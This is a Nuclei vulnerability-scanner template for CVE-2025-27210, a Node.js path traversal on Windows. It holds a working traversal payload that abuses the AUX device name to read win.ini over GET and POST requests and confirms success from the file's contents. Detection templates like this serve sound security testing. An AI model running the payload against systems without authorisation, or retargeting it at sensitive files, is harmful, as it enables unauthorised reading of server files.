id: cve-2025-27210

info:
  name: Node.js < 24.4.1 - Path Traversal on Windows (CVE-2025-27210)
  author: Eslam Abu Bakr @eabubakr21
  severity: high
  description: |
    A path traversal vulnerability exists in Node.js on Windows due to improper handling of
    reserved device names (e.g., AUX, CON) in path.normalize() and path.join(). An attacker
    can bypass path restrictions to read arbitrary files on the server's file system.

    This template attempts to read the C:\Windows\win.ini file to confirm the vulnerability
    using both GET and POST request patterns.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-27210 # Placeholder link
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2025-27210
    cwe-id: CWE-22
  tags: cve,cve2025,nodejs,path-traversal,windows

# The 'self-contained' line has been removed to allow running without -esc.

# Define the malicious payload. It uses the AUX bypass to normalize the path.
# We will URL-encode it in the request itself.
variables:
  # The payload tries to traverse 6 directories up, then uses the AUX bypass to normalize the path.
  # Finally, it targets the win.ini file.
  payload: "..\\..\\..\\..\\..\\..\\AUX\\..\\Windows\\win.ini"

requests:
  # Request 1: Exploit via GET method (payload in URL path)
  - method: GET
    path:
      - "{{BaseURL}}/{{url_encode(payload)}}"

    matchers-condition: and
    matchers:
      # A successful file read should return HTTP 200 OK.
      - type: status
        status:
          - 200

      # We confirm the file content by looking for a unique string inside win.ini.
      - type: word
        part: body
        words:
          - "[windows]"
          - "[fonts]"
        condition: or

  # Request 2: Exploit via POST method (payload in a parameter)
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "filename={{url_encode(payload)}}"

    matchers-condition: and
    matchers:
      # The matchers are identical to the GET request.
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "[windows]"
          - "[fonts]"
        condition: or
